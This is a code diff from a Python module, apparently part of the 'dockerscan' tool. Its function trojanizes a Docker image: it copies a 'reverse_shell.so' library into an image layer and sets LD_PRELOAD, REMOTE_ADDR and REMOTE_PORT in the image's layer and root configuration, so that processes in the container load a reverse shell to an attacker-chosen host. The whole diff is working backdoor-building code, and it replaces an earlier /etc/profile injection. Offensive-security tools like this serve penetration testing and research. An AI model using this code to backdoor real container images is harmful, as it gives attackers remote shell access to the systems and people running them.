@@ -1,10 +1,14 @@
+import json
 import os.path
 import logging
 
+from dockerscan.actions.image.docker_api import read_file_from_image
 from .model import *
 from ..docker_api import *
 
 log = logging.getLogger("dockerscan")
+
+REMOTE_SHELL_PATH = "/usr/share/lib/reverse_shell.so"
 
 
 def run_image_modify_trojanize_dockerscan(
@@ -17,6 +21,7 @@ def run_image_modify_trojanize_dockerscan(
 
     if not output_docker_image:
         output_docker_image = os.path.basename(config.image_path)
+
     if not output_docker_image.endswith("tar"):
         output_docker_image += ".tar"
 
@@ -32,10 +37,10 @@ def run_image_modify_trojanize_dockerscan(
 
         with extract_layer_in_tmp_dir(img, old_layer_digest) as d:
 
-            # 3 - Trojanize
+            # Start trojanizing
             log.info(" > Starting trojaning process")
 
-            # 4 - Copy the shell
+            # 3 - Copy the shell
             log.info(" > Coping the shell: 'reverse_shell.so' "
                      "to '/etc/profile'")
 
@@ -44,30 +49,49 @@ def run_image_modify_trojanize_dockerscan(
                                       "reverse_shell.so")
             copy_file_to_image_folder(d,
                                       shell_path,
-                                      "/etc/reverse_shell.so")
-
-            # 5 - Add LD_PRELOAD to /etc/profile
-            log.info(" > Add LD_PRELOAD to /etc/profile")
-            with open(get_file_path_from_img(d,
-                                             "/etc/profile"), "a") as p:
-                p.write("export LD_PRELOAD={}\n". \
-                        format("/etc/reverse_shell.so"))
+                                      REMOTE_SHELL_PATH)
 
             new_layer_path, new_layer_digest = \
                 build_image_layer_from_dir("new_layer.tar", d)
 
-            # 6 - Updating the manifest
+            # 5 - Updating the manifest
             new_manifest = build_manifest_with_new_layer(manifest,
                                                          old_layer_digest,
                                                          new_layer_digest)
 
-            # 7 - Create new docker image
+            # Add new enviroment vars with LD_PRELOAD AND REMOTE ADDR
+            json_info_last_layer = read_file_from_image(img,
+                                             "{}/json".format(
+                                                 old_layer_digest))
+
+            json_info_last_layer = json.loads(json_info_last_layer.decode())
+
+            new_env_vars = {
+                "LD_PRELOAD": REMOTE_SHELL_PATH,
+                "REMOTE_ADDR": config.remote_addr,
+                "REMOTE_PORT": config.remote_port
+            }
+
+            new_json_data = update_layer_environment_vars(
+                json_info_last_layer,
+                new_env_vars
+            )
+
+            _, json_info_root_layer = get_root_json_from_image(img)
+            new_json_info_root_layer = update_layer_environment_vars(
+                json_info_root_layer,
+                new_env_vars
+            )
+
+            # 6 - Create new docker image
             log.info(" > Creating new docker image")
             create_new_docker_image(new_manifest,
                                     output_docker_image,
                                     img,
                                     old_layer_digest,
                                     new_layer_path,
-                                    new_layer_digest)
+                                    new_layer_digest,
+                                    new_json_data,
+                                    new_json_info_root_layer)
 
 __all__ = ("run_image_modify_trojanize_dockerscan",)
